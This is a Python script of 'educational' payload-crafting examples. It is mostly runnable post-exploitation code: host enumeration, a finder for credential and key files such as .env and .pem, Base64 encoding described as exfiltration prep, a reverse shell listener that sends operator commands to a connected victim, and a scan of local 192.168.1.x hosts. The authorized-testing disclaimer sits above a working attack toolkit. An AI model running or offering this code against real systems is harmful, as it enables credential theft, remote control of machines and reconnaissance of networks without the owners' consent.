# =============================================================
# EXAMPLES — Payload Crafting (Educational)
# For authorized security testing and learning only
# =============================================================
import socket
import os
import platform
import base64
import json


# --- 1. System enumeration (post-exploitation recon) ---
print("[1] System Enumeration:")
info = {
    "hostname": platform.node(),
    "os": platform.system(),
    "os_version": platform.version(),
    "architecture": platform.machine(),
    "python": platform.python_version(),
    "user": os.environ.get("USERNAME", os.environ.get("USER", "unknown")),
    "cwd": os.getcwd(),
    "home": os.path.expanduser("~"),
}
for key, val in info.items():
    print(f"  {key:<14}: {val}")
print()


# --- 2. File discovery ---
print("[2] Interesting file finder:")

def find_interesting_files(start_path, max_depth=2):
    interesting = [".env", ".key", ".pem", ".conf", ".ini", ".cfg",
                   "password", "credentials", "secret"]
    found = []
    for root, dirs, files in os.walk(start_path):
        depth = root.replace(start_path, "").count(os.sep)
        if depth >= max_depth:
            dirs.clear()
            continue
        for f in files:
            if any(ext in f.lower() for ext in interesting):
                found.append(os.path.join(root, f))
    return found

# Only search current project dir
found = find_interesting_files(".", max_depth=1)
print(f"  Found {len(found)} potentially interesting files")
for f in found[:5]:
    print(f"    {f}")
print()


# --- 3. Data encoding for transport ---
print("[3] Data encoding:")
secret_data = {"passwords": ["admin123", "test456"], "keys": ["ssh-rsa AAAA..."]}

# JSON → Base64 (common exfil encoding)
json_str = json.dumps(secret_data)
b64 = base64.b64encode(json_str.encode()).decode()
print(f"  Original size: {len(json_str)} bytes")
print(f"  Base64 size:   {len(b64)} bytes")
print(f"  Encoded:       {b64[:50]}...")

# Decode
decoded = json.loads(base64.b64decode(b64))
print(f"  Decoded match: {decoded == secret_data}")
print()


# --- 4. Simple reverse shell listener (conceptual) ---
print("[4] Reverse shell listener template:")
print("""
  def listener(port):
      server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      server.bind(("0.0.0.0", port))
      server.listen(1)
      print(f"[*] Listening on port {port}...")
      conn, addr = server.accept()
      print(f"[+] Connection from {addr}")
      while True:
          cmd = input("shell> ")
          if cmd == "exit": break
          conn.send(cmd.encode())
          print(conn.recv(4096).decode())
      conn.close()
""")


# --- 5. Network info gathering ---
print("[5] Network info:")
hostname = socket.gethostname()
try:
    local_ip = socket.gethostbyname(hostname)
    print(f"  Local IP: {local_ip}")
except:
    print("  Could not determine local IP")

# Check common internal targets
print("  Quick internal scan:")
for ip_end in [1, 2, 254]:
    ip = f"192.168.1.{ip_end}"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.3)
    result = s.connect_ex((ip, 80))
    status = "open" if result == 0 else "closed"
    print(f"    {ip}:80 — {status}")
    s.close()
